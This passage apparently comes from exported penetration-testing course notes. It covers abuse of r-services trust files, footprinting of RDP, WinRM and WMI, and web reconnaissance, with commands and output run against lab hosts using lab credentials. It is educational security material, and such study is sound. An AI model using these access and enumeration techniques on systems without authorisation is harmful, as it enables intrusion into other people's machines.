They are most commonly used by commercial operating systems such as Solaris, HP-UX, and AIX. While less common nowadays, we do run into them from time to time during our internal penetration tests so it is worth understanding how to approach them.\n\nThe [R-commands](https://en.wikipedia.org/wiki/Berkeley_r-commands) suite consists of the following programs:\n\n- rcp (`remote copy`)\n- rexec (`remote execution`)\n- rlogin (`remote login`)\n- rsh (`remote shell`)\n- rstat\n- ruptime\n- rwho (`remote who`)\n\nEach command has its intended functionality; however, we will only cover the most commonly abused `r-commands`. The table below will provide a quick overview of the most frequently abused commands, including the service daemon they interact with, over what port and transport method to which they can be accessed, and a brief description of each.\n\n|**Command**|**Service Daemon**|**Port**|**Transport Protocol**|**Description**|\n|---|---|---|---|---|\n|`rcp`|`rshd`|514|TCP|Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the `cp` command on Linux but provides `no warning to the user for overwriting existing files on a system`.|\n|`rsh`|`rshd`|514|TCP|Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files for validation.|\n|`rexec`|`rexecd`|512|TCP|Enables a user to run shell commands on a remote machine. Requires authentication through the use of a `username` and `password` through an unencrypted network socket. Authentication is overridden by the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files.|\n|`rlogin`|`rlogind`|513|TCP|Enables a user to log in to a remote host over the network. It works similarly to `telnet` but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files.|\n\nThe /etc/hosts.equiv file contains a list of trusted hosts and is used to grant access to other systems on the network. When users on one of these hosts attempt to access the system, they are automatically granted access without further authentication.\n\n#### /etc/hosts.equiv\n\nLinux Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/hosts.equiv\n\n# <hostname> <local username>\npwnbox cry0l1t3\n```\n\nNow that we have a basic understanding of `r-commands`, let's do some quick footprinting using `Nmap` to determine if all necessary ports are open.\n\n#### Scanning for R-Services\n\nLinux Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -sV -p 512,513,514 10.0.17.2\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2022-12-02 15:02 EST\nNmap scan report for 10.0.17.2\nHost is up (0.11s latency).\n\nPORT    STATE SERVICE    VERSION\n512/tcp open  exec?\n513/tcp open  login?\n514/tcp open  tcpwrapped\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 145.54 seconds\n```\n\n#### Access Control & Trusted Relationships\n\nThe primary concern for `r-services`, and one of the primary reasons `SSH` was introduced to replace it, is the inherent issues regarding access control for these protocols. R-services rely on trusted information sent from the remote client to the host machine they are attempting to authenticate to. By default, these services utilize [Pluggable Authentication Modules (PAM)](https://debathena.mit.edu/trac/wiki/PAM) for user authentication onto a remote system; however, they also bypass this authentication through the use of the `/etc/hosts.equiv` and `.rhosts` files on the system. The `hosts.equiv` and `.rhosts` files contain a list of hosts (`IPs` or `Hostnames`) and users that are `trusted` by the local host when a connection attempt is made using `r-commands`. Entries in either file can appear like the following:\n\n**Note:** The `hosts.equiv` file is recognized as the global configuration regarding all users on a system, whereas `.rhosts` provides a per-user configuration.\n\n#### Sample .rhosts File\n\nLinux Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat .rhosts\n\nhtb-student     10.0.17.5\n+               10.0.17.10\n+               +\n```\n\nAs we can see from this example, both files follow the specific syntax of `<username> <ip address>` or `<username> <hostname>` pairs. Additionally, the `+` modifier can be used within these files as a wildcard to specify anything. In this example, the `+` modifier allows any external user to access r-commands from the `htb-student` user account via the host with the IP address `10.0.17.10`.\n\nMisconfigurations in either of these files can allow an attacker to authenticate as another user without credentials, with the potential for gaining code execution. Now that we understand how we can potentially abuse misconfigurations in these files let's attempt to try logging into a target host using `rlogin`.\n\n#### Logging in Using Rlogin\n\nLinux Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ rlogin 10.0.17.2 -l htb-student\n\nLast login: Fri Dec  2 16:11:21 from localhost\n\n[htb-student@localhost ~]$\n```\n\nWe have successfully logged in under the `htb-student` account on the remote host due to the misconfigurations in the `.rhosts` file. Once successfully logged in, we can also abuse the `rwho` command to list all interactive sessions on the local network by sending requests to the UDP port 513.\n\n#### Listing Authenticated Users Using Rwho\n\nLinux Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ rwho\n\nroot     web01:pts/0 Dec  2 21:34\nhtb-student     workstn01:tty1  Dec  2 19:57  2:25       \n```\n\nFrom this information, we can see that the `htb-student` user is currently authenticated to the `workstn01` host, whereas the `root` user is authenticated to the `web01` host. We can use this to our advantage when scoping out potential usernames to use during further attacks on hosts over the network. However, the `rwho` daemon periodically broadcasts information about logged-on users, so it might be beneficial to watch the network traffic.\n\n#### Listing Authenticated Users Using Rusers\n\nTo provide additional information in conjunction with `rwho`, we can issue the `rusers` command. This will give us a more detailed account of all logged-in users over the network, including information such as the username, hostname of the accessed machine, TTY that the user is logged in to, the date and time the user logged in, the amount of time since the user typed on the keyboard, and the remote host they logged in from (if applicable).\n\nLinux Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ rusers -al 10.0.17.5\n\nhtb-student     10.0.17.5:console          Dec 2 19:57     2:25\n```\n\nAs we can see, R-services are less frequently used nowadays due to their inherent security flaws and the availability of more secure protocols such as SSH. To be a well-rounded information security professional, we must have a broad and deep understanding of many systems, applications, protocols, etc. So, file away this knowledge about R-services because you never know when you may encounter them.\n\n---\n\n## Final Thoughts\n\nRemote management services can provide us with a treasure trove of data and often be abused for unauthorized access through either weak/default credentials or password re-use. We should always probe these services for as much information as we can gather and leave no stone unturned, especially when we have compiled a list of credentials from elsewhere in the target network.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/19-Windows Remote Management Protocols",
    "path": "02_CPTS/03-Footprinting/19-Windows Remote Management Protocols.md",
    "title": "19 Windows Remote Management Protocols",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Windows servers can be managed locally using Server Manager administration tasks on remote servers. Remote management is enabled by default starting with Windows Server 2016. Remote management is a co...",
    "category": "02_CPTS",
    "content": "Windows servers can be managed locally using Server Manager administration tasks on remote servers. Remote management is enabled by default starting with Windows Server 2016. Remote management is a component of the Windows hardware management features that manage server hardware locally and remotely. These features include a service that implements the WS-Management protocol, hardware diagnostics and control through baseboard management controllers, and a COM API and script objects that enable us to write applications that communicate remotely through the WS-Management protocol.\n\nThe main components used for remote management of Windows and Windows servers are the following:\n\n- Remote Desktop Protocol (`RDP`)\n    \n- Windows Remote Management (`WinRM`)\n    \n- Windows Management Instrumentation (`WMI`)\n    \n\n---\n\n## RDP\n\nThe [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration.\n\nFor an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside. If [Network Address Translation](https://en.wikipedia.org/wiki/Network_address_translation) (`NAT`) is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server. In addition, port forwarding must be set up on the NAT router in the direction of the server.\n\nRDP has handled [Transport Layer Security](https://en.wikipedia.org/wiki/Transport_Layer_Security) (`TLS/SSL`) since Windows Vista, which means that all data, and especially the login process, is protected in the network by its good encryption. However, many Windows systems do not insist on this but still accept inadequate encryption via [RDP Security](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/8e8b2cca-c1fa-456c-8ecb-a82fc60b2322). Nevertheless, even with this, an attacker is still far from being locked out because the identity-providing certificates are merely self-signed by default. This means that the client cannot distinguish a genuine certificate from a forged one and generates a certificate warning for the user.\n\nThe `Remote Desktop` service is installed by default on Windows servers and does not require additional external applications. This service can be activated using the `Server Manager` and comes with the default setting to allow connections to the service only to hosts with [Network level authentication](https://en.wikipedia.org/wiki/Network_Level_Authentication) (`NLA`).\n\n---\n\n## Footprinting the Service\n\nScanning the RDP service can quickly give us a lot of information about the host. For example, we can determine if `NLA` is enabled on the server or not, the product version, and the hostname.\n\n#### Nmap\n\nWindows Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 15:45 CET\nNmap scan report for 10.129.201.248\nHost is up (0.036s latency).\n\nPORT     STATE SERVICE       VERSION\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-enum-encryption: \n|   Security layer\n|     CredSSP (NLA): SUCCESS\n|     CredSSP with Early User Auth: SUCCESS\n|_    RDSTLS: SUCCESS\n| rdp-ntlm-info: \n|   Target_Name: ILF-SQL-01\n|   NetBIOS_Domain_Name: ILF-SQL-01\n|   NetBIOS_Computer_Name: ILF-SQL-01\n|   DNS_Domain_Name: ILF-SQL-01\n|   DNS_Computer_Name: ILF-SQL-01\n|   Product_Version: 10.0.17763\n|_  System_Time: 2021-11-06T13:46:00+00:00\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.26 seconds\n```\n\nIn addition, we can use `--packet-trace` to track the individual packages and inspect their contents manually. We can see that the `RDP cookies` (`mstshash=nmap`) used by Nmap to interact with the RDP server can be identified by `threat hunters` and various security services such as [Endpoint Detection and Response](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (`EDR`), and can lock us out as penetration testers on hardened networks.\n\nWindows Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:23 CET\nSENT (0.2506s) ICMP [10.10.14.20 > 10.129.201.248 Echo request (type=8/code=0) id=8338 seq=0] IP [ttl=53 id=5122 iplen=28 ]\nSENT (0.2507s) TCP 10.10.14.20:55516 > 10.129.201.248:443 S ttl=42 id=24195 iplen=44  seq=1926233369 win=1024 <mss 1460>\nSENT (0.2507s) TCP 10.10.14.20:55516 > 10.129.201.248:80 A ttl=55 id=50395 iplen=40  seq=0 win=1024\nSENT (0.2517s) ICMP [10.10.14.20 > 10.129.201.248 Timestamp request (type=13/code=0) id=8247 seq=0 orig=0 recv=0 trans=0] IP [ttl=38 id=62695 iplen=40 ]\nRCVD (0.2814s) ICMP [10.129.201.248 > 10.10.14.20 Echo reply (type=0/code=0) id=8338 seq=0] IP [ttl=127 id=38158 iplen=28 ]\nSENT (0.3264s) TCP 10.10.14.20:55772 > 10.129.201.248:3389 S ttl=56 id=274 iplen=44  seq=2635590698 win=1024 <mss 1460>\nRCVD (0.3565s) TCP 10.129.201.248:3389 > 10.10.14.20:55772 SA ttl=127 id=38162 iplen=44  seq=3526777417 win=64000 <mss 1357>\nNSOCK INFO [0.4500s] nsock_iod_new2(): nsock_iod_new (IOD #1)\nNSOCK INFO [0.4500s] nsock_connect_tcp(): TCP connection requested to 10.129.201.248:3389 (IOD #1) EID 8\nNSOCK INFO [0.4820s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.201.248:3389]\nService scan sending probe NULL to 10.129.201.248:3389 (tcp)\nNSOCK INFO [0.4830s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 6000ms) EID 18\nNSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: READ TIMEOUT for EID 18 [10.129.201.248:3389]\nService scan sending probe TerminalServerCookie to 10.129.201.248:3389 (tcp)\nNSOCK INFO [6.4880s] nsock_write(): Write request for 42 bytes to IOD #1 EID 27 [10.129.201.248:3389]\nNSOCK INFO [6.4880s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 5000ms) EID 34\nNSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 27 [10.129.201.248:3389]\nNSOCK INFO [6.5240s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 34 [10.129.201.248:3389] (19 bytes): .........4.........\nService scan match (Probe TerminalServerCookie matched with TerminalServerCookie line 13640): 10.129.201.248:3389 is ms-wbt-server.  Version: |Microsoft Terminal Services|||\n\n...SNIP...\n\nNSOCK INFO [6.5610s] nsock_write(): Write request for 54 bytes to IOD #1 EID 27 [10.129.201.248:3389]\nNSE: TCP 10.10.14.20:36630 > 10.129.201.248:3389 | 00000000: 03 00 00 2a 25 e0 00 00 00 00 00 43 6f 6f 6b 69    *%      Cooki\n00000010: 65 3a 20 6d 73 74 73 68 61 73 68 3d 6e 6d 61 70 e: mstshash=nmap\n00000020: 0d 0a 01 00 08 00 0b 00 00 00  \n\n...SNIP...\n\nNSOCK INFO [6.6820s] nsock_write(): Write request for 57 bytes to IOD #2 EID 67 [10.129.201.248:3389]\nNSOCK INFO [6.6820s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 67 [10.129.201.248:3389]\nNSE: TCP 10.10.14.20:36630 > 10.129.201.248:3389 | SEND\nNSOCK INFO [6.6820s] nsock_read(): Read request from IOD #2 [10.129.201.248:3389] (timeout: 5000ms) EID 74\nNSOCK INFO [6.7180s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 74 [10.129.201.248:3389] (211 bytes)\nNSE: TCP 10.10.14.20:36630 < 10.129.201.248:3389 | \n00000000: 30 81 d0 a0 03 02 01 06 a1 81 c8 30 81 c5 30 81 0          0  0\n00000010: c2 a0 81 bf 04 81 bc 4e 54 4c 4d 53 53 50 00 02        NTLMSSP\n00000020: 00 00 00 14 00 14 00 38 00 00 00 35 82 8a e2 b9        8   5\n00000030: 73 b0 b3 91 9f 1b 0d 00 00 00 00 00 00 00 00 70 s              p\n00000040: 00 70 00 4c 00 00 00 0a 00 63 45 00 00 00 0f 49  p L     cE    I\n00000050: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0\n00000060: 00 31 00 02 00 14 00 49 00 4c 00 46 00 2d 00 53  1     I L F - S\n00000070: 00 51 00 4c 00 2d 00 30 00 31 00 01 00 14 00 49  Q L - 0 1     I\n00000080: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0\n00000090: 00 31 00 04 00 14 00 49 00 4c 00 46 00 2d 00 53  1     I L F - S\n000000a0: 00 51 00 4c 00 2d 00 30 00 31 00 03 00 14 00 49  Q L - 0 1     I\n000000b0: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0\n000000c0: 00 31 00 07 00 08 00 1d b3 e8 f2 19 d3 d7 01 00  1\n000000d0: 00 00 00\n\n...SNIP...\n```\n\nA Perl script named [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) has also been developed by [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) that can unauthentically identify the security settings of RDP servers based on the handshakes.\n\n#### RDP Security Check - Installation\n\nWindows Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo cpan\n\nLoading internal logger. Log::Log4perl recommended for better logging\n\nCPAN.pm requires configuration, but most of it can be done automatically.\nIf you answer 'no' below, you will enter an interactive dialog for each\nconfiguration option instead.\n\nWould you like to configure as much as possible automatically? [yes] yes\n\n\nAutoconfiguration complete.\n\ncommit: wrote '/root/.cpan/CPAN/MyConfig.pm'\n\nYou can re-run configuration any time with 'o conf init' in the CPAN shell\n\ncpan shell -- CPAN exploration and modules installation (v2.27)\nEnter 'h' for help.\n\n\ncpan[1]> install Encoding::BER\n\nFetching with LWP:\nhttp://www.cpan.org/authors/01mailrc.txt.gz\nReading '/root/.cpan/sources/authors/01mailrc.txt.gz'\n............................................................................DONE\n...SNIP...\n```\n\n#### RDP Security Check\n\nWindows Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check\ndrxh3kr@htb[/htb]$ ./rdp-sec-check.pl 10.129.201.248\n\nStarting rdp-sec-check v0.9-beta ( http://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Sun Nov  7 16:50:32 2021\n\n[+] Scanning 1 hosts\n\nTarget:    10.129.201.248\nIP:        10.129.201.248\nPort:      3389\n\n[+] Checking supported protocols\n\n[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER\n[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER\n[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Supported\n\n[+] Checking RDP Security Layer\n\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported\n\n[+] Summary of protocol support\n\n[-] 10.129.201.248:3389 supports PROTOCOL_SSL   : FALSE\n[-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE\n[-] 10.129.201.248:3389 supports PROTOCOL_RDP   : FALSE\n\n[+] Summary of RDP encryption support\n\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_NONE   : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_40BIT  : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_56BIT  : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE\n\n[+] Summary of security issues\n\n\nrdp-sec-check v0.9-beta completed at Sun Nov  7 16:50:33 2021\n```\n\nAuthentication and connection to such RDP servers can be made in several ways. For example, we can connect to RDP servers on Linux using `xfreerdp`, `rdesktop`, or `Remmina` and interact with the GUI of the server accordingly.\n\n#### Initiate an RDP Session\n\nWindows Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ xfreerdp /u:cry0l1t3 /p:\"P455w0rd!\" /v:10.129.201.248\n\n[16:37:47:135] [95319:95320] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state\n[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr\n[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd\n[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr\n[16:37:47:447] [95319:95320] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized\n[16:37:47:453] [95319:95320] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state\n[16:37:47:453] [95319:95320] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state\n[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - creating directory /home/cry0l1t3/.config/freerdp\n[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - creating directory [/home/cry0l1t3/.config/freerdp/certs]\n[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - created directory [/home/cry0l1t3/.config/freerdp/server]\n[16:37:47:599] [95319:95320] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0\n[16:37:47:599] [95319:95320] [WARN][com.freerdp.crypto] - CN = ILF-SQL-01\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.201.248:3389) \n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - Common Name (CN):\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] -      ILF-SQL-01\n[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!\nCertificate details for 10.129.201.248:3389 (RDP-Server):\n        Common Name: ILF-SQL-01\n        Subject:     CN = ILF-SQL-01\n        Issuer:      CN = ILF-SQL-01\n        Thumbprint:  b7:5f:00:ca:91:00:0a:29:0c:b5:14:21:f3:b0:ca:9e:af:8c:62:d6:dc:f9:50:ec:ac:06:38:1f:c5:d6:a9:39\nThe above X.509 certificate could not be verified, possibly because you do not have\nthe CA certificate in your certificate store, or the certificate has expired.\nPlease look at the OpenSSL documentation on how to add a private CA to the store.\n\n\nDo you trust the above certificate? (Y/T/N) y\n\n[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] - VERSION ={\n[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductMajorVersion: 6\n[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductMinorVersion: 1\n[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductBuild: 7601\n[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      Reserved: 0x000000\n```\n\nAfter successful authentication, a new window will appear with access to the server's desktop to which we have connected.\n\n---\n\n## WinRM\n\nThe Windows Remote Management (`WinRM`) is a simple Windows integrated remote management protocol based on the command line. WinRM uses the Simple Object Access Protocol (`SOAP`) to establish connections to remote hosts and their applications. Therefore, WinRM must be explicitly enabled and configured starting with Windows 10. WinRM relies on `TCP` ports `5985` and `5986` for communication, with the last port `5986 using HTTPS`, as ports 80 and 443 were previously used for this task. However, since port 80 was mainly blocked for security reasons, the newer ports 5985 and 5986 are used today.\n\nAnother component that fits WinRM for administration is Windows Remote Shell (`WinRS`), which lets us execute arbitrary commands on the remote system. The program is even included on Windows 7 by default. Thus, with WinRM, it is possible to execute a remote command on another server.\n\nServices like remote sessions using PowerShell and event log merging require WinRM. It is enabled by default starting with the `Windows Server 2012` version, but it must first be configured for older server versions and clients, and the necessary firewall exceptions created.\n\n---\n\n## Footprinting the Service\n\nAs we already know, WinRM uses TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`) by default, which we can scan using Nmap. However, often we will see that only HTTP (`TCP 5985`) is used instead of HTTPS (`TCP 5986`).\n\n#### Nmap WinRM\n\nWindows Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:31 CET\nNmap scan report for 10.129.201.248\nHost is up (0.030s latency).\n\nPORT     STATE SERVICE VERSION\n5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.34 seconds\n```\n\nIf we want to find out whether one or more remote servers can be reached via WinRM, we can easily do this with the help of PowerShell. The [Test-WsMan](https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.2) cmdlet is responsible for this, and the host's name in question is passed to it. In Linux-based environments, we can use the tool called [evil-winrm](https://github.com/Hackplayers/evil-winrm), another penetration testing tool designed to interact with WinRM.\n\nWindows Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Cry0l1t3\\Documents>\n```\n\n---\n\n## WMI\n\nWindows Management Instrumentation (`WMI`) is Microsoft's implementation and also an extension of the Common Information Model (`CIM`), core functionality of the standardized Web-Based Enterprise Management (`WBEM`) for the Windows platform. WMI allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (`WMIC`). WMI is not a single program but consists of several programs and various databases, also known as repositories.\n\n---\n\n## Footprinting the Service\n\nThe initialization of the WMI communication always takes place on `TCP` port `135`, and after the successful establishment of the connection, the communication is moved to a random port. For example, the program [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) from the Impacket toolkit can be used for this.\n\n#### WMIexec.py\n\nWindows Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:\"P455w0rD!\"@10.129.201.248 \"hostname\"\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] SMBv3.0 dialect used\nILF-SQL-01\n```\n\nAgain, it is necessary to mention that the knowledge gained from installing these services and playing around with the configurations on our own Windows Server VM for gaining experience and developing the functional principle and the administrator's point of view cannot be replaced by reading manuals. Therefore, we strongly recommend setting up your own Windows Server, experimenting with the settings, and scanning these services repeatedly to see the differences in the results.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/01-Cheet sheet  web Information Gathering",
    "path": "02_CPTS/04-Information Gathering - Web Edition/01-Cheet sheet  web Information Gathering.md",
    "title": "01 Cheet Sheet  Web Information Gathering",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Web reconnaissance is the first step in any security assessment or penetration testing engagement. It's akin to a detective's initial investigation, meticulously gathering clues and evidence about a t...",
    "category": "02_CPTS",
    "content": "\nWeb reconnaissance is the first step in any security assessment or penetration testing engagement. It's akin to a detective's initial investigation, meticulously gathering clues and evidence about a target before formulating a plan of action. In the digital realm, this translates to accumulating information about a website or web application to identify potential vulnerabilities, security misconfigurations, and valuable assets.\n\nThe primary goals of web reconnaissance revolve around gaining a comprehensive understanding of the target's digital footprint. This includes:\n\n- `Identifying Assets`: Discovering all associated domains, subdomains, and IP addresses provides a map of the target's online presence.\n- `Uncovering Hidden Information`: Web reconnaissance aims to uncover directories, files, and technologies that are not readily apparent and could serve as entry points for an attacker.\n- `Analyzing the Attack Surface`: By identifying open ports, running services, and software versions, you can assess the potential vulnerabilities and weaknesses of the target.\n- `Gathering Intelligence`: Collecting information about employees, email addresses, and technologies used can aid in social engineering attacks or identifying specific vulnerabilities associated with certain software.\n\nWeb reconnaissance can be conducted using either active or passive techniques, each with its own advantages and drawbacks:\n\n|Type|Description|Risk of Detection|Examples|\n|---|---|---|---|\n|Active Reconnaissance|Involves directly interacting with the target system, such as sending probes or requests.|Higher|Port scanning, vulnerability scanning, network mapping|\n|Passive Reconnaissance|Gathers information without directly interacting with the target, relying on publicly available data.|Lower|Search engine queries, WHOIS lookups, DNS enumeration, web archive analysis, social media|\n\n## WHOIS\n\nWHOIS is a query and response protocol used to retrieve information about domain names, IP addresses, and other internet resources. It's essentially a directory service that details who owns a domain, when it was registered, contact information, and more. In the context of web reconnaissance, WHOIS lookups can be a valuable source of information, potentially revealing the identity of the website owner, their contact information, and other details that could be used for further investigation or social engineering attacks.\n\nFor example, if you wanted to find out who owns the domain `example.com`, you could run the following command in your terminal:\n\nCode: bash\n\n```bash\nwhois example.com\n```\n\nThis would return a wealth of information, including the registrar, registration, and expiration dates, nameservers, and contact information for the domain owner.\n\nHowever, it's important to note that WHOIS data can be inaccurate or intentionally obscured, so it's always wise to verify the information from multiple sources. Privacy services can also mask the true owner of a domain, making it more difficult to obtain accurate information through WHOIS.\n\n## DNS\n\nThe Domain Name System (DNS) functions as the internet's GPS, translating user-friendly domain names into the numerical IP addresses computers use to communicate. Like GPS converting a destination's name into coordinates, DNS ensures your browser reaches the correct website by matching its name with its IP address. This eliminates memorizing complex numerical addresses, making web navigation seamless and efficient.\n\nThe `dig` command allows you to query DNS servers directly, retrieving specific information about domain names. For instance, if you want to find the IP address associated with `example.com`, you can execute the following command:\n\nCode: bash\n\n```bash\ndig example.com A\n```\n\nThis command instructs `dig` to query the DNS for the `A` record (which maps a hostname to an IPv4 address) of `example.com`. The output will typically include the requested IP address, along with additional details about the query and response. By mastering the `dig` command and understanding the various DNS record types, you gain the ability to extract valuable information about a target's infrastructure and online presence.\n\nDNS servers store various types of records, each serving a specific purpose:\n\n|Record Type|Description|\n|---|---|\n|A|Maps a hostname to an IPv4 address.|\n|AAAA|Maps a hostname to an IPv6 address.|\n|CNAME|Creates an alias for a hostname, pointing it to another hostname.|\n|MX|Specifies mail servers responsible for handling email for the domain.|\n|NS|Delegates a DNS zone to a specific authoritative name server.|\n|TXT|Stores arbitrary text information.|\n|SOA|Contains administrative information about a DNS zone.|\n\n## 